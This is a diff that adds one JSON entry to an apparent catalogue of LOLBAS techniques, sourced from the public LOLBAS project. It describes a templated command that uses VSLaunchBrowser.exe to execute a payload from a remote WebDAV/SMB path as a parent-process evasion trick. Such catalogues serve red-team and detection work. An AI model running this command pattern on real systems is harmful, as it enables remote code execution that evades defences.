@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-vslaunchbrowser-exe-execute-2",
+  "name": "LOLBAS · VSLaunchBrowser.exe (Execute) #2",
+  "command": "VSLaunchBrowser.exe .exe {PATH_SMB}",
+  "description": "Execute payload from WebDAV server via VSLaunchBrowser as parent process",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "vslaunchbrowser",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/VSLaunchBrowser/",
+  "upstream_id": "VSLaunchBrowser.exe/Execute/1",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — VSLaunchBrowser.exe",
+      "url": "https://lolbas-project.github.io/lolbas/VSLaunchBrowser/"
+    }
+  ]
+}
